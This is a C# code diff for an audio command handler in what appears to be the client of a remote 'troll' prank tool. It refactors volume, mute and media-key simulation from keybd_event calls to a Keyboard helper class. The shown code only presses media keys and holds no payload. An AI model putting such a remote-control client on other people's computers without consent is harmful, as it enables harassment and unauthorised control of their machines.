@@ -14,17 +14,9 @@ namespace Trollkit_Client.Modules.CommandHandlers
 {
 	public class AudioHandler : ICommandHandler
 	{
-		[DllImport("user32.dll")]
-		static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);
-
-		private const int NEXT_TRACK = 0xB0;
-		private const int PLAY_PAUSE = 0xB3;
-		private const int PREV_TRACK = 0xB1;
-		private const int VOLUME_MUTE = 0xAD;
-		private const int VOLUME_UP = 0xAF;
-		private const int VOLUME_DOWN = 0xAE;
 		public bool HandleCommand(TransferCommandObject obj)
 		{
+			Keyboard keyboard = new Keyboard();
 			switch (obj.Command)
 			{
 				case "PlayBeep":
@@ -37,22 +29,22 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					PlayWesselMove();
 					return true;
 				case "VolumeUp":
-					keybd_event(VOLUME_UP, 0, 0, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.VOLUME_UP);
 					return true;
 				case "VolumeDown":
-					keybd_event(VOLUME_DOWN, 0, 0, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.VOLUME_DOWN);
 					return true;
 				case "Mute":
-					keybd_event(VOLUME_MUTE, 0, 0, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.VOLUME_MUTE);
 					return true;
 				case "Play_Pause":
-					keybd_event(PLAY_PAUSE, 0, 1, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.MEDIA_PLAY_PAUSE);
 					return true;
 				case "NextTrack":
-					keybd_event(NEXT_TRACK, 0, 1, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.MEDIA_NEXT_TRACK);
 					return true;
 				case "PreviousTrack":
-					keybd_event(PREV_TRACK, 0, 1, IntPtr.Zero);
+					keyboard.Send(Keyboard.ScanCodeShort.MEDIA_PREV_TRACK);
 					return true;
 			}
 			return false;
